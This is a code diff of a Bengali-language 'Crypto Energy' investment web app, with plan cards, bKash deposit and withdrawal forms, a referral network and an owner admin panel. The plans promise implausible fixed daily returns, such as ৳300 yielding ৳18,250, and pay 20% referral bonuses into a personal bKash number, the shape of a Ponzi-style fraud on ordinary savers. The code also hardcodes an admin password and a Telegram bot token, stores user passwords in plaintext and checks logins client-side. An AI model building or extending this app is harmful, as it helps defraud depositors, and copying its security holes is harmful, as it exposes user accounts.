+        <div>পরিশোধের পর সাধারণত ৫-৩০ মিনিটের মধ্যে তহবিল ব্যালেন্সে আসে। ৩০ মিনিট পার হলে রেফারেন্স আইডি সহ সাপোর্টে যোগাযোগ করুন।</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ৪. রিচার্জ পরিমাণ ও TxID সাবমিট পেজ -->
+  <section id="depositAmountPage" class="page">
+    <div class="instruction-card">
+      <div style="font-weight:bold; color:var(--danger);">⚠️ গুরুত্বপূর্ণ জমার নির্দেশনাবলী</div>
+      <div style="margin-top:6px;">আমাদের অফিশিয়াল বিকাশ নম্বর ব্যতীত অন্য কোনো মাধ্যমে লেনদেন করবেন না। ট্রানজেকশন সফল করতে স্থানান্তরিত অর্থ এবং অ্যাপে সাবমিট করা জমার পরিমাণ হুবহু এক হতে হবে।</div>
+    </div>
+
+    <div class="account-asset-card">
+      <span class="profile-meta-title">ইনভেস্টমেন্ট প্ল্যান</span>
+      <input id="targetPlanName" readonly style="font-weight:bold; color:var(--accent-gold);" />
       
-      <div class="card">
-        <h4 style="color:var(--accent); margin-bottom:12px;">🔐 সিকিউরিটি পাসওয়ার্ড পরিবর্তন</h4>
-        <div class="inputGroup">
-          <input id="oldPass" type="password" placeholder="বর্তমান পাসওয়ার্ড দিন" />
-          <button class="eyeBtn" type="button" onclick="togglePassView('oldPass', this)">👁️</button>
-        </div>
-        <div class="inputGroup">
-          <input id="newPass" type="password" placeholder="নতুন পাসওয়ার্ড দিন (৬+ সংখ্যা)" />
-          <button class="eyeBtn" type="button" onclick="togglePassView('newPass', this)">👁️</button>
-        </div>
-        <div class="inputGroup">
-          <input id="confPass" type="password" placeholder="নতুন পাসওয়ার্ড নিশ্চিত করুন" />
-          <button class="eyeBtn" type="button" onclick="togglePassView('confPass', this)">👁️</button>
-        </div>
-        <button class="btn" style="margin-top:14px;" onclick="changePassword()">পাসওয়ার্ড আপডেট করুন</button>
-      </div>
-    </section>
+      <div style="margin-top:12px;" class="profile-meta-title">পরিমাণ (৳)</div>
+      <input id="depositAmountField" type="number" placeholder="পরিমাণ বসান" />
 
-    <section id="adminPanel" class="page">
-      <div class="card" style="border-color:var(--danger)">
-        <h3 style="color:var(--danger); margin-bottom:12px;">🔒 সিকিউর ওনার ড্যাশবোর্ড</h3>
-        <div style="display:flex; gap:10px; margin-bottom:16px;">
-          <button class="btn" style="background:#24324d; color:#fff;" onclick="adminShowWithdraws()">উইথড্র ম্যানেজ</button>
-          <button class="btn" style="background:#24324d; color:#fff;" onclick="adminShowUsers()">ইউজার ও ডিপোজিট</button>
-        </div>
-        <div id="adminResult"></div>
+      <div class="amount-chips">
+        <div class="chip" onclick="setChipAmount(300)">৳৩০০</div>
+        <div class="chip" onclick="setChipAmount(500)">৳৫০০</div>
+        <div class="chip" onclick="setChipAmount(1000)">৳১০০০</div>
+        <div class="chip" onclick="setChipAmount(2500)">৳২৫০০</div>
+        <div class="chip" onclick="setChipAmount(5000)">৳৫০০০</div>
+        <div class="chip" onclick="setChipAmount(10000)">৳১০০০০</div>
       </div>
-    </section>
 
-  </div>
+      <div style="margin-top:15px; padding:12px; background:rgba(0,0,0,0.2); border-radius:10px; display:flex; justify-content:space-between; align-items:center;">
+        <div>
+          <span class="profile-meta-title" style="font-size:10px;">বিকাশ পার্সোনাল নম্বর</span>
+          <span style="font-weight:bold; font-size:15px; color:var(--accent-gold); display:block;">01797025790</span>
+        </div>
+        <button class="tab-btn active" style="max-width:70px; padding:6px; font-size:12px;" onclick="copyNumber()">কপি</button>
+      </div>
+
+      <div style="margin-top:12px;" class="profile-meta-title">টাকা পাঠানোর পর ট্রানজেকশন আইডি (TxID)</div>
+      <input id="depositTxField" placeholder="যেমন: 8M2N9X7Z" />
+
+      <button class="btn-primary" style="margin-top:20px;" onclick="executeDeposit()">জমা নিশ্চিত করুন</button>
+    </div>
+  </section>
+
+  <!-- ৫. দল (টিম/রেফার) পেজ ইন্টারফেস -->
+  <section id="teamPage" class="page">
+    <div class="account-asset-card" style="text-align:center;">
+      <h3 style="color:var(--accent-gold); font-weight:bold;">রেফারেল নেটওয়ার্ক</h3>
+      <p style="font-size:12px; color:var(--text-muted); margin-top:4px;">আপনার বন্ধুদের আমন্ত্রণ জানান এবং প্রতিটি সফল অ্যাক্টিভেশনে ২০% কমিশন বোনাস লাভ করুন।</p>
+      <input id="refLinkField" readonly style="text-align:center; background:rgba(0,0,0,0.3); border-color:var(--nav-active); margin-top:12px;" />
+      <button class="btn-primary" onclick="copyRefLink()">লিংক কপি করুন</button>
+    </div>
+
+    <div style="font-size:13px; font-weight:bold; margin:20px 0 10px 4px; color:var(--text-muted);">আপনার টিমের সদস্য তালিকা:</div>
+    <div id="teamMembersList"></div>
+  </section>
+
+  <!-- ৬. লেনদেন বিবরণী রেকর্ড পেজ -->
+  <section id="txHistoryPage" class="page">
+    <div class="account-asset-card">
+      <div class="profile-meta-title">প্রধান অ্যাকাউন্ট সম্পদ</div>
+      <div style="font-size:28px; font-weight:bold; color:var(--nav-active); margin-top:4px;" id="txAssetBalance">৳ 0.00</div>
+    </div>
+    
+    <div class="tabs-container">
+      <button class="tab-btn active" id="txAllTab" onclick="filterTxHistory('all')">সব রেকর্ড</button>
+      <button class="tab-btn" id="txDepTab" onclick="filterTxHistory('dep')">আয় / জমা</button>
+      <button class="tab-btn" id="txWitTab" onclick="filterTxHistory('wit')">উত্তোলন</button>
+    </div>
+
+    <div id="txHistoryDataBox"></div>
+  </section>
+
+  <!-- ৭. উত্তোলন ফান্ড ফর্ম পেজ -->
+  <section id="withdrawFormPage" class="page">
+    <div class="account-asset-card">
+      <div style="font-weight:bold; font-size:15px; margin-bottom:12px; color:var(--accent-gold);">ফান্ড উত্তোলন করুন</div>
+      
+      <label class="profile-meta-title">পেমেন্ট মেথড</label>
+      <select id="witMethodField">
+        <option value="bKash">bKash (বিকাশ পার্সোনাল)</option>
+      </select>
+
+      <div style="margin-top:12px;"><label class="profile-meta-title">টাকা প্রাপ্তির অ্যাকাউন্ট নম্বর</label></div>
+      <input id="witNumberField" placeholder="01XXXXXXXXX" />
+
+      <div style="margin-top:12px;"><label class="profile-meta-title">উত্তোলনের পরিমাণ (নূন্যতম ২০০ ৳)</label></div>
+      <input id="witAmountField" type="number" placeholder="৳ পরিমাণ লিখুন" />
+
+      <div style="margin-top:12px;"><label class="profile-meta-title">অ্যাকাউন্ট সিকিউরিটি পাসওয়ার্ড</label></div>
+      <div class="input-group">
+        <input id="witPassField" type="password" placeholder="আপনার পাসওয়ার্ড লিখুন" />
+        <button class="eyeBtn" type="button" onclick="togglePassView('witPassField', this)">👁️</button>
+      </div>
+
+      <button class="btn-primary" style="margin-top:20px;" onclick="executeWithdraw()">উইথড্র সাবমিট করুন</button>
+    </div>
+  </section>
+
+  <!-- ৮. আমার (প্রোফাইল) পেজ ইন্টারফেস -->
+  <section id="profilePage" class="page">
+    <div class="profile-header">
+      <div class="avatar-circle">👤</div>
+      <div>
+        <div id="pfPhone" style="font-weight:bold; font-size:18px; letter-spacing:0.5px;">01XXXXXXXXX</div>
+        <div style="font-size:11px; color:#fff; background:rgba(0,0,0,0.2); padding:2px 8px; border-radius:10px; display:inline-block; margin-top:4px;">সদস্য আইডি • Active</div>
+      </div>
+    </div>
+
+    <!-- বর্তমান সম্পদ কার্ড -->
+    <div class="account-asset-card" style="margin: 16px; margin-top:-16px; background:#12573f; border:1px solid rgba(255,255,255,0.05);">
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <div>
+          <div class="profile-meta-title">প্রধান অ্যাকাউন্ট</div>
+          <div style="font-size:18px; font-weight:bold; margin-top:2px;" id="pfMainBal">৳ 0.00</div>
+        </div>
+        <div style="text-align:center;">
+          <div class="profile-meta-title">কমিশন বোনাস</div>
+          <div style="font-size:18px; font-weight:bold; margin-top:2px;" id="pfCommBal">৳ 0.00</div>
+        </div>
+        <div style="text-align:right;">
+          <div class="profile-meta-title">মোট জমা</div>
+          <div style="font-size:18px; font-weight:bold; margin-top:2px;" id="pfTotalDep">৳ 0.00</div>
+        </div>
+      </div>
+    </div>
+
+    <div style="padding:0 16px;">
+      <div class="menu-section-title">তাহবিল ও রেকর্ডস</div>
+      <div class="menu-grid">
+        <div class="menu-item" onclick="showPage('depositChannel')">
+          <div class="menu-left"><span>📥</span> জমা ফিজিক্যাল</div>
+          <span class="menu-arrow">▶</span>
+        </div>
+        <div class="menu-item" onclick="showPage('withdrawForm')">
+          <div class="menu-left"><span>📤</span> উত্তোলন ফান্ড</div>
+          <span class="menu-arrow">▶</span>
+        </div>
+        <div class="menu-item" onclick="showPage('txHistory')">
+          <div class="menu-left"><span>📜</span> লেনদেন বিবরণী</div>
+          <span class="menu-arrow">▶</span>
+        </div>
+      </div>
+
+      <div class="menu-section-title">নিরাপত্তা ও তথ্য</div>
+      <div style="display:flex; flex-direction:column; gap:8px;">
+        <div class="menu-item" onclick="showChangePassView()">
+          <div class="menu-left"><span>🔑</span> লগইন পাসওয়ার্ড পরিবর্তন</div>
+          <span class="menu-arrow">▶</span>
+        </div>
+        <a href="https://t.me/Cryptoenergyincome" target="_blank" class="menu-item">
+          <div class="menu-left"><span>ℹ️</span> আমাদের সম্পর্কে বিবরণ</div>
+          <span class="menu-arrow">▶</span>
+        </a>
+      </div>
+
+      <button class="btn-primary" style="background:var(--danger); color:#fff; margin-top:30px; border-radius:12px;" onclick="logout()">⚙️ সাইন আউট (Logout)</button>
+    </div>
+  </section>
+
+  <!-- ৯. পাসওয়ার্ড রিসেট সাব-পেজ -->
+  <section id="changePassPage" class="page">
+    <div class="account-asset-card">
+      <div class="profile-meta-title">বর্তমান লগইন পাসওয়ার্ড</div>
+      <input id="oldPassField" type="password" placeholder="বর্তমান পাসওয়ার্ড দিন" />
+      
+      <div style="margin-top:12px;" class="profile-meta-title">নতুন সিকিউর পাসওয়ার্ড</div>
+      <input id="newPassField" type="password" placeholder="কমপক্ষে ৬ ডিজিট দিন" />
+
+      <div style="margin-top:12px;" class="profile-meta-title">নতুন পাসওয়ার্ড নিশ্চিত করুন</div>
+      <input id="confPassField" type="password" placeholder="আবার টাইপ করুন" />
+
+      <button class="btn-primary" style="margin-top:20px;" onclick="executePasswordReset()">পাসওয়ার্ড আপডেট করুন</button>
+    </div>
+  </section>
+
+  <!-- ১০. ওনার কন্ট্রোল অ্যাডমিন প্যানেল -->
+  <section id="adminPanelPage" class="page">
+    <div class="account-asset-card" style="border:1px solid var(--danger);">
+      <h3 style="color:var(--danger); font-weight:bold; font-size:16px; margin-bottom:12px;">🔒 ওনার অ্যাডমিন ড্যাশবোর্ড</h3>
+      
+      <!-- অ্যাডমিন সার্চ ইঞ্জিন -->
+      <div style="margin-bottom: 15px; display: flex; gap: 8px;">
+        <input id="adminSearchInput" placeholder="ইউজার মোবাইল নম্বর দিয়ে সার্চ দিন..." style="margin-top:0;" />
+        <button class="tab-btn active" style="max-width:80px; padding:0 10px;" onclick="executeAdminSearch()">সার্চ</button>
+      </div>
+
+      <div style="display:flex; gap:10px; margin-bottom:15px;">
+        <button class="tab-btn active" style="background:rgba(255,255,255,0.05); color:#fff;" onclick="adminLoadWithdrawals()">উইথড্র ম্যানেজমেন্ট</button>
+        <button class="tab-btn active" style="background:rgba(255,255,255,0.05); color:#fff;" onclick="adminLoadUsers()">ইউজার ও ডিপোজিট</button>
+      </div>
+      <div id="adminPanelStatusBox"></div>
+    </div>
+  </section>
+
 </div>
 
+<!-- কন্ট্রোল বটম নেভিগেশন বার -->
 <nav class="bottomNav" id="bottomNav" style="display:none">
   <button class="navBtn active" onclick="showPage('home')"><span class="navIcon">🏠</span>হোম</button>
-  <button class="navBtn" onclick="showPage('team')"><span class="navIcon">👥</span>টিম</button>
-  <button class="navBtn" onclick="showPage('withdraw')"><span class="navIcon">💸</span>উইথড্র</button>
-  <button class="navBtn" onclick="showPage('profile')"><span class="navIcon">👤</span>প্রোফাইল</button>
+  <button class="navBtn" onclick="showPage('income')"><span class="navIcon">📈</span>আয়</button>
+  <button class="navBtn" onclick="showPage('team')"><span class="navIcon">👥</span>দল</button>
+  <button class="navBtn" onclick="showPage('profile')"><span class="navIcon">👤</span>আমার</button>
 </nav>
 
 <script>
@@ -303,524 +492,562 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-const STORAGE = 'crypto_invest_v3';
-const ADMIN_PHONE = '01797025790';
-const TG_BOT_TOKEN = '8725434647:AAHew-jdOUoojb3StI2_Uc1_KFn5GfN7ZvI';
-const TG_CHAT_ID = '6514948285';
+const STORAGE_KEY = 'crypto_energy_v3';
+const ADMIN_NUMBER = '01797025790';
+const TELEGRAM_BOT_TOKEN = '8725434647:AAHew-jdOUoojb3StI2_Uc1_KFn5GfN7ZvI';
+const TELEGRAM_CHAT_ID = '6514948285';
 
-let pageHistory = ['home'];
+let internalHistory = ['home'];
+let selectedGatewayName = 'bKash';
+let activeIncomeViewMode = 'active';
+let activeTxFilterMode = 'all';
 
-function getCurrent(){ return localStorage.getItem(STORAGE + '_cur') }
-function setCurrent(p){ localStorage.setItem(STORAGE + '_cur', p) }
-function clearCurrent(){ localStorage.removeItem(STORAGE + '_cur') }
-function $(id){ return document.getElementById(id) }
+// ৬টি আপডেটেড ক্রিপ্টো কারেন্সি প্যাকেজ প্ল্যান এবং কাস্টম বিটকয়েন/ক্রিপ্টো গ্রাফিক্স ইমেজ
+const SOLAR_PRODUCTS = [
+  { id: 'Crypto Core Tier 1', min: 300, daily: 50, total: 18250, days: 365, img: 'https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&w=600&q=80' },
+  { id: 'Crypto Core Tier 2', min: 500, daily: 110, total: 40150, days: 365, img: 'https://images.unsplash.com/photo-1516245834210-c4c142787335?auto=format&fit=crop&w=600&q=80' },
+  { id: 'Crypto Core Tier 3', min: 1000, daily: 240, total: 87600, days: 365, img: 'https://images.unsplash.com/photo-1622630998477-20aa696ecb05?auto=format&fit=crop&w=600&q=80' },
+  { id: 'Crypto Matrix Plus', min: 2500, daily: 650, total: 237250, days: 365, img: 'https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=600&q=80' },
+  { id: 'Crypto Node Master', min: 5000, daily: 1500, total: 547500, days: 365, img: 'https://images.unsplash.com/photo-1640340434855-6084b1f4901c?auto=format&fit=crop&w=600&q=80' },
+  { id: 'Crypto Quantum Prime', min: 10000, daily: 3300, total: 1204500, days: 365, img: 'https://images.unsplash.com/photo-1621761191319-c6fb62004040?auto=format&fit=crop&w=600&q=80' }
+];
+
+function $(id){ return document.getElementById(id); }
+function getUserSession(){ return localStorage.getItem(STORAGE_KEY + '_user'); }
+function setUserSession(ph){ localStorage.setItem(STORAGE_KEY + '_user', ph); }
+function destroySession(){ localStorage.removeItem(STORAGE_KEY + '_user'); }
 
 function showToast(msg) {
   const t = $('toast'); t.innerText = msg;
   t.classList.add('show'); setTimeout(() => { t.classList.remove('show'); }, 2500);
 }
 
-const PLANS = [
-  {id:'Bitcoin (BTC)', min:1000, daily:120, img:'https://assets.coingecko.com/coins/images/1/large/bitcoin.png'},
-  {id:'Ethereum (ETH)', min:2000, daily:280, img:'https://assets.coingecko.com/coins/images/279/large/ethereum.png'},
-  {id:'Solana (SOL)', min:3000, daily:350, img:'https://assets.coingecko.com/coins/images/4128/large/solana.png'},
-  {id:'Binance (BNB)', min:4000, daily:500, img:'https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png'},
-  {id:'Cardano (ADA)', min:5000, daily:700, img:'https://assets.coingecko.com/coins/images/975/large/cardano.png'},
-  {id:'Ripple (XRP)', min:7000, daily:900, img:'https://i.postimg.co/d0Y8M6yX/ripple-xrp.png'}
-];
-
-async function bootstrapAdmin(){
-  const docRef = db.collection('users').doc(ADMIN_PHONE);
-  const doc = await docRef.get();
-  if(!doc.exists){
-    await docRef.set({ phone:ADMIN_PHONE, password:'721059', balance:0, activePlans:[], referrals:[], refEarn:0, deposits:[], withdrawals:[], referrer:null, myRefId:'cr_admin72' });
+async function verifyAdminNode(){
+  const ref = db.collection('users').doc(ADMIN_NUMBER);
+  const snap = await ref.get();
+  if(!snap.exists){
+    await ref.set({ phone:ADMIN_NUMBER, password:'721059', balance:0, activePlans:[], referrals:[], refEarn:0, deposits:[], withdrawals:[], referrer:null, myRefId:'crypto_owner72' });
   }
 }
-bootstrapAdmin();
+verifyAdminNode();
 
-function showPage(page){
-  if(pageHistory[pageHistory.length - 1] !== page) {
-    pageHistory.push(page);
-  }
-  
-  $('backBtn').style.visibility = (page === 'home') ? 'hidden' : 'visible';
-  
-  if(page === 'home' || page === 'profile') {
-    $('topWalletCard').style.display = 'block';
-  } else {
-    $('topWalletCard').style.display = 'none';
-  }
-
-  const map = {
-    home: 'homePage', deposit:'depositPage', detail:'detailPage', team:'teamPage',
-    withdraw:'withdrawPage', withdrawHistory:'withdrawHistory', profile:'profilePage', adminPanel:'adminPanel',
-    activePlans: 'activePlansPage'
-  };
-  
-  document.querySelectorAll('.page').forEach(el=>el.classList.remove('active'));
-  if(map[page]) $(map[page]).classList.add('active');
-  
-  document.querySelectorAll('.bottomNav .navBtn').forEach(b=>b.classList.remove('active'));
-  const navIdx = ['home', 'team', 'withdraw', 'profile'].indexOf(page);
-  if(navIdx !== -1) document.querySelectorAll('.bottomNav .navBtn')[navIdx].classList.add('active');
-  
-  renderAll();
-}
-
-function goBack() {
-  if (pageHistory.length > 1) {
-    pageHistory.pop();
-    const prev = pageHistory[pageHistory.length - 1];
-    showPage(prev);
-  } else {
-    showPage('home');
-  }
+function togglePassView(id, btn) {
+  const target = $(id);
+  if(target.type === 'password') { target.type = 'text'; btn.innerText = '🙈'; }
+  else { target.type = 'password'; btn.innerText = '👁️'; }
 }
 
 window.addEventListener('load', ()=>{
-  setTimeout(()=>{ $('loader').style.display='none'; initFlow(); }, 1200);
+  setTimeout(()=>{ $('loader').style.display='none'; parseAppEntry(); }, 1000);
 });
 
-function initFlow(){
-  const cur = getCurrent();
-  if(!cur){
+function parseAppEntry(){
+  const session = getUserSession();
+  if(!session){
     $('authOverlay').style.display = 'flex';
     $('app').style.display = 'none';
     $('bottomNav').style.display = 'none';
-    $('tgSupport').style.display = 'none';
-    $('adminBtn').style.display = 'none';
   } else {
     $('authOverlay').style.display = 'none';
     $('app').style.display = 'block';
     $('bottomNav').style.display = 'flex';
-    $('tgSupport').style.display = 'flex';
-    $('adminBtn').style.display = (cur === ADMIN_PHONE) ? 'block' : 'none';
+    $('adminBtn').style.display = (session === ADMIN_NUMBER) ? 'block' : 'none';
     showPage('home');
-    doDailyCreditIfDue();
+    processDailyEarningDistribution();
   }
 }
 
-function togglePassView(id, btn) {
-  const input = $(id);
-  if(input.type === 'password') {
-    input.type = 'text'; btn.innerText = '🙈';
-  } else {
-    input.type = 'password'; btn.innerText = '👁️';
-  }
-}
-
-let authMode = 'login';
+let authState = 'login';
 $('toggleAuth').addEventListener('click', ()=>{
-  authMode = authMode === 'login' ? 'signup' : 'login';
-  $('authTitle').innerText = authMode === 'login' ? 'Welcome Back' : 'Create Account';
-  $('authPrimary').innerText = authMode === 'login' ? 'লগইন করুন' : 'সাইনআপ করুন';
-  $('toggleAuth').innerText = authMode === 'login' ? 'নতুন অ্যাকাউন্ট খুলুন (Signup)' : 'অলরেডি অ্যাকাউন্ট আছে? Login';
+  authState = authState === 'login' ? 'signup' : 'login';
+  $('authTitle').innerText = authState === 'login' ? 'Welcome Back' : 'Create Account';
+  $('authPrimary').innerText = authState === 'login' ? 'লগইন করুন' : 'সাইনআপ করুন';
+  $('toggleAuth').innerText = authState === 'login' ? 'নতুন অ্যাকাউন্ট তৈরি করুন (Signup)' : 'অলরেডি অ্যাকাউন্ট আছে? Login';
 });
 
 $('authPrimary').addEventListener('click', async ()=>{
   const phone = $('authPhone').value.trim();
   const pass = $('authPass').value.trim();
-  if(!/^01\d{9}$/.test(phone)) return showToast('সঠিক ফোন দিন (01xxxxxxxxx)');
-  if(pass.length < 6) return showToast('পাসওয়ার্ড সর্বনিম্ন６ডিজিট দিন');
+  if(!/^01\d{9}$/.test(phone)) return showToast('সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন');
+  if(pass.length < 6) return showToast('পাসওয়ার্ড নূন্যতম ৬ অক্ষরের দিন');
 
-  const userRef = db.collection('users').doc(phone);
-  const userDoc = await userRef.get();
+  const uRef = db.collection('users').doc(phone);
+  const snap = await uRef.get();
 
-  if(authMode === 'signup'){
-    if(userDoc.exists) return showToast('এই নাম্বারে অলরেডি অ্যাকাউন্ট আছে!');
-    
-    const randomRefId = 'cr_' + Math.random().toString(36).substring(2, 10);
-    const newUser = { phone, password:pass, balance:0, activePlans:[], referrals:[], refEarn:0, deposits:[], withdrawals:[], referrer:null, myRefId: randomRefId };
+  if(authState === 'signup'){
+    if(snap.exists) return showToast('এই নাম্বার দিয়ে অলরেডি অ্যাকাউন্ট খোলা আছে');
+    const uRefId = 'cry_' + Math.random().toString(36).substring(2, 9);
+    const payload = { phone, password:pass, balance:0, activePlans:[], referrals:[], refEarn:0, deposits:[], withdrawals:[], referrer:null, myRefId:uRefId };
     
     const urlParams = new URLSearchParams(window.location.search);
-    const refParam = urlParams.get('ref');
-    if(refParam){
-      const snapshot = await db.collection('users').where('myRefId', '==', refParam).get();
-      if(!snapshot.empty){
-        const referrerDoc = snapshot.docs[0];
-        newUser.referrer = referrerDoc.id;
-        
-        const refData = referrerDoc.data();
-        refData.referrals.push({phone, joined:new Date().toLocaleDateString('bn-BD'), depositAmt:0});
-        await db.collection('users').doc(referrerDoc.id).update({ referrals: refData.referrals });
+    const refCode = urlParams.get('ref');
+    if(refCode){
+      const matchQuery = await db.collection('users').where('myRefId', '==', refCode).get();
+      if(!matchQuery.empty){
+        const parentDoc = matchQuery.docs[0];
+        payload.referrer = parentDoc.id;
+        const pData = parentDoc.data();
+        pData.referrals.push({ phone, joined: new Date().toLocaleDateString('bn-BD'), targetValue:0 });
+        await db.collection('users').doc(parentDoc.id).update({ referrals: pData.referrals });
       }
     }
-    
-    await userRef.set(newUser);
-    
-    const tgMsg = `👤 <b>নতুন ইউজার রেজিস্টার্ড হয়েছে!</b>\n\n📱 মোবাইল: <code>${phone}</code>\n🔗 রেফার আইডি: ${refParam ? refParam : 'সরাসরি (None)'}`;
-    sendTelegramNotice(tgMsg);
-
-    showToast('রেজিস্ট্রেশন সফল! লগইন করুন।');
-    authMode = 'login'; $('toggleAuth').click();
+    await uRef.set(payload);
+    sendTelegramAlert(`👤 <b>নতুন ইউজার যুক্ত হয়েছে!</b>\n\n📱 মোবাইল: <code>${phone}</code>\n🔗 রেফারেল কোড: ${refCode || 'সরাসরি (None)'}`);
+    showToast('অ্যাকাউন্ট তৈরি সম্পন্ন হয়েছে! লগইন করুন।');
+    authState = 'login'; $('toggleAuth').click();
   } else {
-    if(!userDoc.exists || userDoc.data().password !== pass) return showToast('ফোন নাম্বার বা পাসওয়ার্ড ভুল!');
-    setCurrent(phone); initFlow();
+    if(!snap.exists || snap.data().password !== pass) return showToast('মোবাইল নাম্বার অথবা পাসওয়ার্ড ভুল!');
+    setUserSession(phone); parseAppEntry();
   }
 });
 
-async function renderAll(){
-  const cur = getCurrent(); if(!cur) return;
-  const userDoc = await db.collection('users').doc(cur).get();
-  if(!userDoc.exists) return;
-  const me = userDoc.data();
+function showPage(pID){
+  if(internalHistory[internalHistory.length - 1] !== pID) internalHistory.push(pID);
+  $('backBtn').style.visibility = (pID === 'home') ? 'hidden' : 'visible';
   
-  $('mePhone').innerText = me.phone;
-  $('meBalance').innerText = me.balance + ' ৳';
-  $('pfPhone').innerText = me.phone;
-  $('pfBalance').innerText = me.balance + ' ৳';
-  
-  if(me.activePlans && me.activePlans.length > 0) {
-    const names = me.activePlans.map(p => p.id.toUpperCase()).join(' + ');
-    $('mePlan').innerText = `${me.activePlans.length} প্যাক সচল (${names})`;
-  } else {
-    $('mePlan').innerText = 'NONE';
-  }
-  
-  renderPlans();
-  renderRefLink(me);
-  renderLists(me);
+  const headers = { home:'CRYPTO ENERGY', income:'ইনভেস্টমেন্ট পোর্টফোলিও', depositChannel:'পেমেন্ট গেটওয়ে', depositAmount:'জমা ফান্ড রিকোয়েস্ট', team:'আমার রেফারেড টিম', txHistory:'লেনদেন বিবরণী', withdrawForm:'টাকা উত্তোলন', profile:'আমার প্রোফাইল', changePass:'পাসওয়ার্ড পরিবর্তন', adminPanelPage:'অ্যাডমিন কন্ট্রোল প্যানেল' };
+  $('pageMainHeaderTitle').innerText = headers[pID] || 'CRYPTO ENERGY';
+
+  const schema = { home:'homePage', income:'incomePage', depositChannel:'depositChannelPage', depositAmount:'depositAmountPage', team:'teamPage', txHistory:'txHistoryPage', withdrawForm:'withdrawFormPage', profile:'profilePage', changePass:'changePassPage', adminPanelPage:'adminPanelPage' };
+  document.querySelectorAll('.page').forEach(el=>el.classList.remove('active'));
+  if(schema[pID]) $(schema[pID]).classList.add('active');
+
+  document.querySelectorAll('.bottomNav .navBtn').forEach(b=>b.classList.remove('active'));
+  const idx = ['home', 'income', 'team', 'profile'].indexOf(pID);
+  if(idx !== -1) document.querySelectorAll('.bottomNav .navBtn')[idx].classList.add('active');
+
+  renderModuleEngine();
 }
 
-function renderPlans(){
-  const grid = $('plansGrid'); grid.innerHTML='';
-  PLANS.forEach(p=>{
-    const el = document.createElement('div'); el.className='plan';
-    el.innerHTML = `
-      <img src="${p.img}" class="crypto-img" alt="crypto">
-      <div class="planTitle">${p.id}</div>
-      <div class="planSub">প্রতিদিন: ${p.daily} ৳</div>
-      <div style="font-size:12px; margin-bottom:10px; color:var(--muted)">দাম: ${p.min} ৳</div>
-      <button class="btn" style="padding:8px; font-size:12px;" onclick='openPlanDetail(${JSON.stringify(p)})'>বিস্তারিত দেখুন</button>
+function goBack(){
+  if(internalHistory.length > 1){
+    internalHistory.pop();
+    showPage(internalHistory[internalHistory.length - 1]);
+  } else showPage('home');
+}
+
+async function renderModuleEngine(){
+  const s = getUserSession(); if(!s) return;
+  const dSnap = await db.collection('users').doc(s).get();
+  if(!dSnap.exists) return;
+  const user = dSnap.data();
+
+  $('mePhone').innerText = user.phone;
+  $('meBalance').innerText = '৳ ' + Number(user.balance).toFixed(2);
+  
+  $('pfPhone').innerText = user.phone;
+  $('pfMainBal').innerText = '৳ ' + Number(user.balance).toFixed(2);
+  $('pfCommBal').innerText = '৳ ' + Number(user.refEarn || 0).toFixed(2);
+  const totalSuccessDep = (user.deposits || []).filter(x=>x.status==='success').reduce((sum,i)=>sum+i.amount, 0);
+  $('pfTotalDep').innerText = '৳ ' + totalSuccessDep.toFixed(2);
+  $('txAssetBalance').innerText = '৳ ' + Number(user.balance).toFixed(2);
+
+  buildProductGrid();
+  buildIncomeDashboard(user);
+  buildTeamView(user);
+  buildTxHistoryList(user);
+  
+  const currentOrigin = window.location.origin + window.location.pathname;
+  $('refLinkField').value = currentOrigin + '?ref=' + (user.myRefId || '');
+}
+
+function buildProductGrid(){
+  const box = $('plansGrid'); box.innerHTML = '';
+  SOLAR_PRODUCTS.forEach(p=>{
+    const card = document.createElement('div'); card.className = 'solar-card';
+    card.innerHTML = `
+      <img src="${p.img}" class="solar-img" alt="Crypto Image">
+      <div class="solar-details">
+        <div class="solar-title">${p.id}</div>
+        <div class="solar-grid">
+          <div class="grid-item"><span class="grid-label">দৈনিক লাভ</span><span class="grid-val">৳${p.daily}</span></div>
+          <div class="grid-item"><span class="grid-label">মেয়াদ</span><span class="grid-val">${p.days} Days</span></div>
+          <div class="grid-item"><span class="grid-label">মোট লাভ</span><span class="grid-val">৳${p.total}</span></div>
+        </div>
+        <div class="solar-footer">
+          <div><div class="solar-price-label">বিনিয়োগ মূল্য</div><div class="solar-price-val">৳${p.min}</div></div>
+          <div class="solar-badge" style="color:var(--accent-gold);">✓ সেফ মাইনিং</div>
+        </div>
+        <button class="solar-action-btn" onclick="initiateProductPurchase('${p.id}', ${p.min})">বিনিয়োগ শুরু করুন</button>
+      </div>
     `;
-    grid.appendChild(el);
+    box.appendChild(card);
   });
 }
 
-function openPlanDetail(plan) {
-  $('detailImg').src = plan.img;
-  $('detailTitle').innerText = plan.id;
-  $('detailPrice').innerText = plan.min + ' ৳';
-  $('detailDaily').innerText = plan.daily + ' ৳';
-  
-  $('detailActionBtn').onclick = () => {
-    openDeposit(plan.id, plan.min);
-  };
-  showPage('detail');
+function initiateProductPurchase(id, min){
+  $('targetPlanName').value = id;
+  $('depositAmountField').value = min;
+  $('depositTxField').value = '';
+  showPage('depositChannel');
 }
 
-function openDeposit(planId, min){
-  $('depositPlan').value = planId; $('depositAmount').value = min; $('depositTx').value = '';
-  showPage('deposit');
+function selectGateway(name){
+  selectedGatewayName = name;
 }
 
-function sendTelegramNotice(textMessage) {
-  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: textMessage, parse_mode: 'HTML' })
-  }).catch(err => console.log("Telegram Error: ", err));
+function proceedToAmountPage(){
+  showPage('depositAmount');
 }
 
-async function submitDeposit(){
-  const plan = $('depositPlan').value; const amount = Number($('depositAmount').value); const tx = $('depositTx').value.trim();
-  if(!tx) return showToast('Transaction ID দিন!');
-  const cur = getCurrent();
-  
-  const now = new Date();
-  const dateTimeStr = now.toLocaleDateString('bn-BD') + " | " + now.toLocaleTimeString('bn-BD');
+function setChipAmount(val){
+  $('depositAmountField').value = val;
+  document.querySelectorAll('.chip').forEach(c=>{
+    if(c.innerText === '৳'+val) c.classList.add('active');
+    else c.classList.remove('active');
+  });
+}
 
